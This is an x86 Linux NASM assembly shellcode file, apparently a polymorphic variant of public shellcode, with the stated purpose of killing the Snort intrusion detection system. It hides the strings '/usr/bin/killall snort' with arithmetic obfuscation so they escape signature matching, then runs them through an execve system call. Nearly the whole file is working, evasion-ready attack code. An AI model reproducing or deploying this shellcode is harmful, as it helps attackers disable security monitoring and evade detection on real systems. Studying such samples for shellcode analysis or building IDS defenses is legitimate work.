; Filename: 3_kill_snort.nasm
; Author:  Zoltan Balazs
; Original shellcode: http://shell-storm.org/shellcode/files/shellcode-741.php
;
; Purpose: Kill snort to disable IDS - polymorphic

global _start

section .text
_start:

    xor eax,eax

    push eax
    push byte +0x74

    ;push dword 0x726f6e73
    mov esi, 0x83807F84
    sub esi, 0x11111111
    mov dword [esp-4],esi
    sub esp, 4

    mov edi,esp
    push eax
    
    ;push dword 0x6c6c616c
    mov esi, 0x7D7D727D
    sub esi, 0x11111111
    mov dword [esp-4],esi
    sub esp, 4

    ;push dword 0x6c696b2f
    mov esi, 0x7D7A7C40
    sub esi, 0x11111111
    mov dword [esp-4],esi
    sub esp, 4

    ;push dword 0x6e69622f
    mov esi, 0x7F7A7340
    sub esi, 0x11111111
    mov dword [esp-4],esi
    sub esp, 4

    ;push dword 0x7273752f
    mov esi, 0x83848640
    sub esi, 0x11111111
    mov dword [esp-4],esi
    sub esp, 4

    mov ebx,esp
    push eax
    push edi
    push ebx
    mov ecx,esp
    xor edx,edx
    mov al,0xb
    int 0x80

